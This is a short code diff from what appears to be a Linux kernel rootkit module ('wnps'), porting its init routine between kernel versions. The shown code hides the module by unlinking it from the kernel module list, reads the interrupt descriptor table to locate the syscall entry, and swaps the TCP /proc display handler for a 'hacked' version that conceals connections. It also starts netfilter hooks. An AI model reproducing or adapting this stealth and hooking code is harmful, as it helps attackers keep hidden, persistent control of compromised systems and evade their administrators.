@@ -439,16 +439,15 @@ int wnps_init(void)
 	struct descriptor_idt *pIdt80;
 	struct module *m = &__this_module;
         struct tcp_seq_afinfo *my_afinfo = NULL;
-        //http://www.linuxquestions.org/questions/linux-kernel-70/2-6-24-proc_net-disappeared-617597/
-        struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;
+        struct proc_dir_entry *my_dir_entry = proc_net->subdir;
 
 	if (m->init == wnps_init)
 		list_del(&m->list);
 		
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,11)
-	kobject_put(&m->mkobj.kobj);
+	kobject_unregister(&m->mkobj.kobj);
 #elif  LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,8)
-	kobject_put(&m->mkobj->kobj);
+	kobject_unregister(&m->mkobj->kobj);
 #endif
         __asm__ volatile ("sidt %0": "=m" (idt48));
 
@@ -486,9 +485,8 @@ int wnps_init(void)
 
         if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data))
         {
-                //http://kerneltrap.org/mailarchive/linux-netdev/2008/4/8/1373694
-                old_tcp4_seq_show = my_afinfo->seq_ops.show;
-                my_afinfo->seq_ops.show = hacked_tcp4_seq_show;
+                old_tcp4_seq_show = my_afinfo->seq_show;
+                my_afinfo->seq_show = hacked_tcp4_seq_show;
         }
         
         netfilter_test_init();
